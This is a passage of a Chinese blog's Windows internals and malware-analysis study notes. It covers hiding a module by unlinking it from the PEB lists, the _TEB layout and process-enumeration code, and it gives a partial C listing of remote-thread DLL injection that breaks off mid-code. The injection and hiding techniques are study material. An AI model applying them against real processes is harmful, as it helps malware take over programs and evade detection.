<h4 id="模块隐藏"><a href="#模块隐藏" class="headerlink" title="模块隐藏"></a>模块隐藏</h4><p>操作系统中3环的进程信息是保存在 <code>PEB</code> 中的，而进程模块信息表是通过双链循环链表实现链接的。</p>
<p>操作系统中的进程模块遍历函数，如 <code>CreateToolhelp32Snapshot</code> 函数，便是通过实现对 <code>_LDR_DATA_TABLE_ENTRY</code> 双向循环链表的遍历实现的。因此，只要我们将链表断链，就可以实现对进程模块的隐藏。</p>
<p><strong>经过测试发现，对 <code>InLoadOrderModuleList</code> 的断链最为重要，即使其他两个链表没有进行断链，依然可以实现对模块的隐藏。</strong></p>
<!-- 代码见 恶意代码.进程隐藏.PEB断链 -->



<p><em><strong>实现3环的模块隐藏，可以彻底实现对模块的隐藏吗？</strong></em></p>
<p>在内核中的 <code>_EPROCESS.VadRoot</code> 成员可以实现遍历进程的内存空间的地址分配情况，仍然可以获得进程中的模块。</p>
<img src="/win32/Win32/windows内核/内核技术.assets/image-20210302130823287.png" alt="image-20210302130823287" style="zoom:80%;" align="left">





<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><h3 id="TEB"><a href="#TEB" class="headerlink" title="_TEB"></a>_TEB</h3><p><code>TEB</code>，<code>Thread Environment Block</code>，线程环境块。</p>
<p><code>_TEB</code> 的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _TEB		<span class="comment">// fs[0]: R3 表示_TEB; R0表示 KPCR</span></span><br><span class="line">nt!_TEB	</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   	kd&gt; dt _NT_TIB</span></span><br><span class="line"><span class="comment">    nt!_NT_TIB</span></span><br><span class="line"><span class="comment">       +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD	// 异常函数处理链表</span></span><br><span class="line"><span class="comment">       +0x004 StackBase        : Ptr32 Void		// R3 初始栈顶</span></span><br><span class="line"><span class="comment">       +0x008 StackLimit       : Ptr32 Void		// R3 栈界限</span></span><br><span class="line"><span class="comment">       +0x00c SubSystemTib     : Ptr32 Void		</span></span><br><span class="line"><span class="comment">       +0x010 FiberData        : Ptr32 Void</span></span><br><span class="line"><span class="comment">       +0x010 Version          : Uint4B</span></span><br><span class="line"><span class="comment">       +0x014 ArbitraryUserPointer : Ptr32 Void</span></span><br><span class="line"><span class="comment">       +0x018 Self             : Ptr32 _NT_TIB</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   +<span class="number">0x01c</span> EnvironmentPointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x020</span> ClientId         : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x028</span> ActiveRpcHandle  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x02c</span> ThreadLocalStoragePointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x030</span> ProcessEnvironmentBlock : Ptr32 _PEB</span><br><span class="line">   +<span class="number">0x034</span> LastErrorValue   : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> CountOfOwnedCriticalSections : Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> CsrClientThread  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x040</span> Win32ThreadInfo  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x044</span> User32Reserved   : [<span class="number">26</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0ac</span> UserReserved     : [<span class="number">5</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0c0</span> WOW32Reserved    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0c4</span> CurrentLocale    : Uint4B</span><br><span class="line">   +<span class="number">0x0c8</span> FpSoftwareStatusRegister : Uint4B</span><br><span class="line">   +<span class="number">0x0cc</span> SystemReserved1  : [<span class="number">54</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0x1a4</span> ExceptionCode    : Int4B</span><br><span class="line">   +<span class="number">0x1a8</span> ActivationContextStack : _ACTIVATION_CONTEXT_STACK</span><br><span class="line">   +<span class="number">0x1bc</span> SpareBytes1      : [<span class="number">24</span>] UChar</span><br><span class="line">   +<span class="number">0x1d4</span> GdiTebBatch      : _GDI_TEB_BATCH</span><br><span class="line">   +<span class="number">0x6b4</span> RealClientId     : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x6bc</span> GdiCachedProcessHandle : Ptr32 Void</span><br><span class="line">   +<span class="number">0x6c0</span> GdiClientPID     : Uint4B</span><br><span class="line">   +<span class="number">0x6c4</span> GdiClientTID     : Uint4B</span><br><span class="line">   +<span class="number">0x6c8</span> GdiThreadLocalInfo : Ptr32 Void</span><br><span class="line">   +<span class="number">0x6cc</span> Win32ClientInfo  : [<span class="number">62</span>] Uint4B</span><br><span class="line">   +<span class="number">0x7c4</span> glDispatchTable  : [<span class="number">233</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xb68</span> glReserved1      : [<span class="number">29</span>] Uint4B</span><br><span class="line">   +<span class="number">0xbdc</span> glReserved2      : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbe0</span> glSectionInfo    : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbe4</span> glSection        : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbe8</span> glTable          : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbec</span> glCurrentRC      : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbf0</span> glContext        : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbf4</span> LastStatusValue  : Uint4B</span><br><span class="line">   +<span class="number">0xbf8</span> StaticUnicodeString : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0xc00</span> StaticUnicodeBuffer : [<span class="number">261</span>] Uint2B</span><br><span class="line">   +<span class="number">0xe0c</span> DeallocationStack : Ptr32 Void</span><br><span class="line">   +<span class="number">0xe10</span> TlsSlots         : [<span class="number">64</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xf10</span> TlsLinks         : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0xf18</span> Vdm              : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf1c</span> ReservedForNtRpc : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf20</span> DbgSsReserved    : [<span class="number">2</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xf28</span> HardErrorsAreDisabled : Uint4B</span><br><span class="line">   +<span class="number">0xf2c</span> Instrumentation  : [<span class="number">16</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xf6c</span> WinSockData      : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf70</span> GdiBatchCount    : Uint4B</span><br><span class="line">   +<span class="number">0xf74</span> InDbgPrint       : UChar</span><br><span class="line">   +<span class="number">0xf75</span> FreeStackOnTermination : UChar</span><br><span class="line">   +<span class="number">0xf76</span> HasFiberData     : UChar</span><br><span class="line">   +<span class="number">0xf77</span> IdealProcessor   : UChar</span><br><span class="line">   +<span class="number">0xf78</span> Spare3           : Uint4B</span><br><span class="line">   +<span class="number">0xf7c</span> ReservedForPerf  : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf80</span> ReservedForOle   : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf84</span> WaitingOnLoaderLock : Uint4B</span><br><span class="line">   +<span class="number">0xf88</span> Wx86Thread       : _Wx86ThreadState</span><br><span class="line">   +<span class="number">0xf94</span> TlsExpansionSlots : Ptr32 Ptr32 Void</span><br><span class="line">   +<span class="number">0xf98</span> ImpersonationLocale : Uint4B</span><br><span class="line">   +<span class="number">0xf9c</span> IsImpersonating  : Uint4B</span><br><span class="line">   +<span class="number">0xfa0</span> NlsCache         : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfa4</span> pShimData        : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfa8</span> HeapVirtualAffinity : Uint4B</span><br><span class="line">   +<span class="number">0xfac</span> CurrentTransactionHandle : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfb0</span> ActiveFrame      : Ptr32 _TEB_ACTIVE_FRAME</span><br><span class="line">   +<span class="number">0xfb4</span> SafeThunkCall    : UChar</span><br><span class="line">   +<span class="number">0xfb5</span> BooleanSpare     : [<span class="number">3</span>] UChar</span><br></pre></td></tr></table></figure>









<h2 id="系统快照"><a href="#系统快照" class="headerlink" title="系统快照"></a>系统快照</h2><p>参考：<code>https://www.write-bug.com/article/1568.html</code></p>
<p>结构体 <code>PROCESSENTRY32</code> 的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagPROCESSENTRY32</span>	</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD   dwSize;	<span class="comment">// 长度 (以字节为单位), 在调用 Process32First 函数之前，将此成员设置为sizeof (PROCESSENTRY32)。如果不初始化 dwSize, 则 Process32First 将失败。</span></span><br><span class="line">    DWORD   cntUsage;	<span class="comment">// 对进程的引用数, 必须设置为1</span></span><br><span class="line">    DWORD   th32ProcessID;          <span class="comment">// 进程的标识符</span></span><br><span class="line">    ULONG_PTR th32DefaultHeapID;	<span class="comment">// 进程的默认堆的标识符</span></span><br><span class="line">    DWORD   th32ModuleID;           <span class="comment">// 进程的模块标识符, 必须为0</span></span><br><span class="line">    DWORD   cntThreads;				<span class="comment">// 进程启动的执行线程数</span></span><br><span class="line">    DWORD   th32ParentProcessID;    <span class="comment">// 父进程的进程标识符</span></span><br><span class="line">    LONG    pcPriClassBase;         <span class="comment">// 此进程创建的线程的基本优先级, 值始终为THREAD_PRIORITY_NORMAL</span></span><br><span class="line">    DWORD   dwFlags;				<span class="comment">// 保留, 不使用</span></span><br><span class="line">    CHAR    szExeFile[MAX_PATH];    <span class="comment">// 进程名</span></span><br><span class="line">&#125; PROCESSENTRY32;</span><br><span class="line"><span class="keyword">typedef</span> PROCESSENTRY32 *  PPROCESSENTRY32;</span><br><span class="line"><span class="keyword">typedef</span> PROCESSENTRY32 *  LPPROCESSENTRY32;</span><br></pre></td></tr></table></figure>



<p>结构体 <code>MODULEENTRY32</code> 的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMODULEENTRY32</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD   dwSize;				<span class="comment">// 结构的大小, 以字节为单位. 在调用 Module32First 函数之前, 将此成员设置为sizeof(MODULEENTRY32). 如果不初始化 dwSize, Module32First 将失败</span></span><br><span class="line">    DWORD   th32ModuleID;       <span class="comment">// 该成员不再使用, 并且始终设置为1</span></span><br><span class="line">    DWORD   th32ProcessID;      <span class="comment">// 进程标识符</span></span><br><span class="line">    DWORD   GlblcntUsage;       <span class="comment">// 模块的负载计数, 通常没有意义, 通常等于0xFFFF</span></span><br><span class="line">    DWORD   ProccntUsage;       <span class="comment">// 模块的负载计数,与 GlblcntUsage 相同, 通常没有意义, 通常等于 0xFFFF</span></span><br><span class="line">    BYTE  * modBaseAddr;        <span class="comment">// 模块基址 </span></span><br><span class="line">    DWORD   modBaseSize;        <span class="comment">// 模块的大小, 以字节为单位</span></span><br><span class="line">    HMODULE hModule;            <span class="comment">// 模块句柄</span></span><br><span class="line">    <span class="keyword">char</span>    szModule[MAX_MODULE_NAME32 + <span class="number">1</span>];	<span class="comment">// 模块名称</span></span><br><span class="line">    <span class="keyword">char</span>    szExePath[MAX_PATH];				<span class="comment">// 模块路径</span></span><br><span class="line">&#125; MODULEENTRY32;</span><br><span class="line"><span class="keyword">typedef</span> MODULEENTRY32 *  PMODULEENTRY32;</span><br><span class="line"><span class="keyword">typedef</span> MODULEENTRY32 *  LPMODULEENTRY32;</span><br></pre></td></tr></table></figure>





<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span><span class="comment">//声明快照函数的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*TCHAR imageFileName[0x100] = &#123;0&#125;;</span></span><br><span class="line"><span class="comment">	DWORD nSize = sizeof(imageFileName);*/</span></span><br><span class="line">	<span class="comment">// 初始化</span></span><br><span class="line">	HANDLE hProcessSnap;	<span class="comment">// 系统快照</span></span><br><span class="line">	HANDLE hModuleSnap;		<span class="comment">// 进程快照</span></span><br><span class="line"></span><br><span class="line">	PROCESSENTRY32 pe32 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	MODULEENTRY32 me32 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(pe32);</span><br><span class="line">	me32.dwSize = <span class="keyword">sizeof</span>(me32);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 拍摄快照</span></span><br><span class="line">	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateToolhelp32Snapshot调用失败\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	BOOL bMoreOfProcess = Process32First(hProcessSnap, &amp;pe32);</span><br><span class="line">	BOOL bMoreOfSection;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> (bMoreOfProcess)</span><br><span class="line">	&#123;</span><br><span class="line">		hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);</span><br><span class="line">		bMoreOfSection = Module32First(hModuleSnap, &amp;me32);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;进程ID(mian): %u - %u\n&quot;</span>, pe32.th32ProcessID, me32.th32ProcessID);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;进程名：%ws - %ws\n&quot;</span>, pe32.szExeFile, me32.szModule);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;镜像基址: %p\n&quot;</span>, me32.modBaseAddr);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;镜像大小: %u\n&quot;</span>, me32.modBaseSize);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;镜像路径: %ws\n&quot;</span>, me32.szExePath);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		bMoreOfProcess = Process32Next(hProcessSnap, &amp;pe32);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hProcessSnap);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/win32/Win32/image-20210210162940870.png" alt="image-20210210162940870"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://walker-nie.github.io/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fup.enterdesk.com%2Fedpic%2Ff6%2Fc9%2Ff6%2Ff6c9f647a533782026c0609ac5d550df.jpg&refer=http%3A%2F%2Fup.enterdesk.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1643531815&t=c2c18e0685888311dca4f731dd286208">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="walker's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/" itemprop="url">恶意代码</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-01-03T13:12:00+08:00">
                2022-01-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
                    <span itemprop="name">恶意代码分析</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  7,152 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  33 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h1><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="ShellCode"><a href="#ShellCode" class="headerlink" title="ShellCode"></a>ShellCode</h3><p><code>Shellcode</code> 与硬编码有何区别？</p>
<p>硬编码中往往含有函数地址、变量地址等，而这些地址是根据该进程的 <code>ImageBase + RVA</code> 计算出来的，将这段硬编码粘贴进其他进程空间往往无法运行。而 <code>Shellcode</code> 是经过特殊处理的硬编码，其运行不依赖于地址要求，可以任意粘贴在目标进程的空间中，仍然可以正常运行。</p>
<p><code>ShellCode</code> 的优缺点？</p>
<ul>
<li>优点：不易检测，只能通过特征码搜索才能发现。</li>
<li>缺点：需要改造硬编码，只适合少量逻辑实现</li>
</ul>
<p><strong><code>ShellCode</code> 注入一定需要我们手动将目标程序加载进内存，并将 <code>ShellCode</code> 写入吗？</strong></p>
<p>其实，这是没有必须要的。我们完全可以使用 <code>win32 API</code> 中的 <code>ReadProcessMemry</code> 和 <code>WriteProcessMemory</code> 函数实现对目标进程的内存读写！通过创建远程线程函数 <code>CreateRemoteThread</code> 函数赋予 <code>ShellCode</code> 处理机即可。</p>
<h3 id="IAT注入"><a href="#IAT注入" class="headerlink" title="IAT注入"></a>IAT注入</h3><h3 id="Dll-注入"><a href="#Dll-注入" class="headerlink" title="Dll 注入"></a>Dll 注入</h3><p>我们可以自己编写一个 <code>dll</code> 文件，在该文件中写入我们想要实现的函数功能，将该 <code>dll</code> 注入到目标进程，以实现控制目标进程，并执行我们想要执行的功能。我们可以通过调用 <code>LoadLibrary</code> 和 <code>CreateRemoteThread</code> 函数实现远程线程 <code>Dll </code> 注入。</p>
<p><strong><code>Dll</code> 注入的本质就是通过远程线程注入，实现目标进程加载我们构造的 <code>Dll</code>  ，以实现执行 <code>Dll</code> 中的特定代码逻辑。</strong></p>
<img src="/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20210202182944956.png" alt="image-20210202182944956" style="zoom: 67%;" align="left">



<p><code>Dll</code> 注入的优缺点？</p>
<ul>
<li><p>优点：可以实现大量逻辑功能的实现</p>
</li>
<li><p>缺点：容易被检测（如：检测 PE指纹，即检测PE文件标识 <code>MZ</code> 等；遍历加载的 <code>dll</code> 文件，可通过断链等手段隐藏）</p>
</li>
</ul>
<p>需要注意哪些坑？</p>
<ul>
<li>在使用 <code>CreateRemoteThread</code> 时，其中的参数地址必须是目标进程的参数地址，而不是本进程的地址。</li>
<li>在使用 <code>CreateRemoteThread</code> 时，其中传给远程线程函数的参数不一定是指针类型的参数，而是需要根据目标函数的参数类型决定的。当目标线程函数是 <code>API</code> 函数时，只能传一个参数，这也意味着只能调用只有一个参数的 <code>API</code> 。</li>
<li>在使用 <code>CreateRemoteThread</code> 时，所指向的远程线程函数中的地址必须是目标进程的地址。</li>
</ul>
<h4 id="加载DLL"><a href="#加载DLL" class="headerlink" title="加载DLL"></a>加载DLL</h4><p><strong><code>Dll</code> 注入的思路</strong></p>
<ol>
<li>获取进程的 <code>PID</code></li>
<li>将要注入的 <code>DLL</code> 名写入进程空间（<code>WriteProcessMemry</code>）</li>
<li>获取<code>LoadLibrary</code> 函数的地址（ <code>GetProcessAddress</code>）</li>
<li>创建远程线程（<code>CreateRemoteThread</code>），将线程函数指向 <code>LoadLibrary</code> 函数，参数指向 <code>DLL</code> 名</li>
<li>获取函数返回值，即 <code>DLL</code> 模块的句柄，即<code>DLL</code> 所加载的内存基址</li>
<li>释放为 <code>DLL</code> 名字申请的空间，关闭句柄</li>
</ol>
<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hProcess = <span class="literal">NULL</span>; <span class="comment">//远程进程句柄</span></span><br><span class="line">HANDLE hThread = <span class="literal">NULL</span>;	<span class="comment">//远程线程句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//进行DLL注入</span></span><br><span class="line">OutputDebugString(<span class="string">L&quot;Inject DLL...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//向远程进程申请空间</span></span><br><span class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);</span><br><span class="line">LPVOID lpszDllPathAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (lpszDllPathAddr)</span><br><span class="line">&#123;</span><br><span class="line">    OutputDebugString(<span class="string">L&quot;DLL名称空间分配成功！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将模块句柄写入程序</span></span><br><span class="line">    <span class="keyword">if</span> (WriteProcessMemory(hProcess, lpszDllPathAddr, lpszDllPath, MAX_PATH, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        OutputDebugString(<span class="string">L&quot;DLL名称写入成功！\n&quot;</span>);</span><br><span class="line">        <span class="comment">//获取函数地址</span></span><br><span class="line">        LPTHREAD_START_ROUTINE addr = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA(<span class="string">&quot;Kernel32&quot;</span>), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (addr)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//创建远程线程</span></span><br><span class="line">            hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, addr, lpszDllPathAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (hThread)</span><br><span class="line">            &#123;</span><br><span class="line">                OutputDebugString(<span class="string">L&quot;线程创建成功!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">                DWORD dwError = <span class="number">0x00</span>;</span><br><span class="line">                <span class="comment">//WaitForSingleObject(hThread, INFINITE);</span></span><br><span class="line">                GetExitCodeThread(hThread, &amp;dwError);</span><br><span class="line">                <span class="keyword">if</span> 